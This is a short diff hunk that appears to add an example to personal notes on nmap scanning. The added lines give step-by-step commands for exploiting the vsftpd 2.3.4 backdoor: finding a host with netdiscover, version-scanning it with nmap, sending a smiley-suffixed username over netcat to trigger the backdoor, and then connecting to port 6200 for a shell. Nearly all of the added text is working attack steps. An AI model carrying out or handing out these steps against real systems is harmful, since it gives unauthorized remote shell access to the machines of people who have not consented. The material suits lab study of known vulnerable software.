@@ -77,3 +77,11 @@ How a system responds to these flags can help an attacker.
 
 CMD      nmap -sX 192.168.1.100      (XMas scam)
 
+EXAMPLE:
+[sudo netdiscover] to find the ip you want to attack
+[nmap -sV 192.168.1.100] = The ftp server that is being used is vsftp 2.3.4 (this version has a backdoor vulnerability)
+[nc 192.168.1.100 21] = Open up a Netcat that you will need to put a user and pass
+user Hacker:)
+pass invalid
+This will open port 6200, but the terminal will appear to hang.
+Open a new terminal and try to connect to port 6200
